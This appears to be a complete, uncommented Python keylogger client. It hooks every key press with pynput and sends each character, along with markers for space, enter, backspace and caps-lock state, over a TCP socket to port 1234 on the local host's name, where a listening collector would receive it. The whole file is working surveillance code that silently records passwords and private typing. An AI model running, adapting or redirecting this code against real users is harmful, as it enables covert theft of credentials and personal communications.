from pynput import keyboard
import socket

caps_lock_on = False

def sendMessage(key):
    global caps_lock_on
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((socket.gethostname(), 1234))

    try:

        if key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.caps_lock:
            caps_lock_on = not caps_lock_on
            char = f"<caps_lock {'on' if caps_lock_on else 'off'}>"
        elif key == keyboard.Key.enter:
            char = "<enter>"
        elif key == keyboard.Key.backspace:
            char = "<backspace>"
        else:
            char = key.char
        s.sendall(char.encode())
    except:
        s.send(''.encode())
    s.close()

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=sendMessage)
    listener.start()
    listener.join()
